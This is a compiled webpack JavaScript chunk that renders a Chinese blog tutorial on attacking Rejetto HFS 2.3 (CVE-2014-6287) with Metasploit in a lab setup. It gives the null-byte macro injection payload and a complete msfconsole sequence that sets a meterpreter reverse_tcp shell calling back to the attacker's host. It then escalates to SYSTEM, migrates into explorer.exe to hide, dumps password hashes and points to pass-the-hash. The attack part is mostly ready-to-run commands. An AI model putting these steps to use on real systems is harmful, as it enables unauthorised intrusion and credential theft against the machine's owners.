(window.webpackJsonp=window.webpackJsonp||[]).push([[329],{626:function(s,e,t){"use strict";t.r(e);var a=t(7),r=Object(a.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"metasploit攻击hfs2-3上的漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#metasploit攻击hfs2-3上的漏洞"}},[s._v("#")]),s._v(" Metasploit攻击HFS2.3上的漏洞")]),s._v(" "),e("p",[s._v("攻击机： kali 192.168.109.137")]),s._v(" "),e("p",[s._v("靶机： windows server 2012 192.168.109.141")]),s._v(" "),e("p",[s._v("工具：Metasploit")]),s._v(" "),e("p",[s._v("根据CVE-2014-6287的描述，Rejetto网络文件服务器(也被称为HSF或者HttpFileServer)的2.3x版本(2.3c以前的版本)中的parserLib.pas文件使用了一个findMacroMaker函数，该漏洞源于parserLib.pas文件没有正确处理空字节。远程攻击者可借助搜索操作中的%00序列利用该漏洞执行任意程序。")]),s._v(" "),e("p",[s._v("下面给出了这个有漏洞的函数：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("function findMacroMarker(s:string; ofs:integer=1):integer;\nbegin result:=reMatch(s, '\\{[.:]|[.:]\\}|\\|', 'm!', ofs) end;\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("这个函数不能正确的处理空字节，所以当我们对"),e("a",{attrs:{href:"http://localhost:80/search=",target:"_blank",rel:"noopener noreferrer"}},[s._v("http://localhost:80/search=%00"),e("OutboundLink")],1),s._v("{.exec|cmd.}发起请求时，就会停止对宏的正则解析，从而导致远程代码的注入。")]),s._v(" "),e("h2",{attrs:{id:"开启msf"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#开启msf"}},[s._v("#")]),s._v(" 开启MSF")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msfconsole\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("h2",{attrs:{id:"渗透漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#渗透漏洞"}},[s._v("#")]),s._v(" 渗透漏洞")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("search hfs\nuse exploit/windows/http/rejetto_hfs_exec\nshow options\nset RHOST 192.168.109.141\nset RPORT 8080\nshow payloads\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.109.137\nset LPORT 4444\nshow options\nexploit\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br")])]),e("p",[s._v("此时，我们已经以管理员的身份获得了Windows server 2012系统的权限。")]),s._v(" "),e("h2",{attrs:{id:"将权限提升为系统级"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#将权限提升为系统级"}},[s._v("#")]),s._v(" 将权限提升为系统级")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("getsystem\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("h2",{attrs:{id:"查看系统进程和meterpreter正在驻留的进程号"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#查看系统进程和meterpreter正在驻留的进程号"}},[s._v("#")]),s._v(" 查看系统进程和Meterpreter正在驻留的进程号")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("ps\ngetpid\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("h2",{attrs:{id:"绑定meterpreter到其他进程"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#绑定meterpreter到其他进程"}},[s._v("#")]),s._v(" 绑定Meterpreter到其他进程")]),s._v(" "),e("p",[s._v("这里，为了保险起见，我们将Meterpreter的进程绑定到explorer.exe的进程号，这里，explorer.exe的进程号为1864,执行如下命令：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("migrate 1864\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("此时，我们再次输入getpid命令查看，Meterpreter正在驻留的进程号变成了1864")]),s._v(" "),e("h2",{attrs:{id:"收集系统密码的哈希值"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#收集系统密码的哈希值"}},[s._v("#")]),s._v(" 收集系统密码的哈希值")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("hashdump\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("完成了哈希值的收集之后，就可以执行pass-the-hash攻击，在没有明文密码的情况下绕过限制。")]),s._v(" "),e("h2",{attrs:{id:"写在最后"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),e("blockquote",[e("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);e.default=r.exports}}]);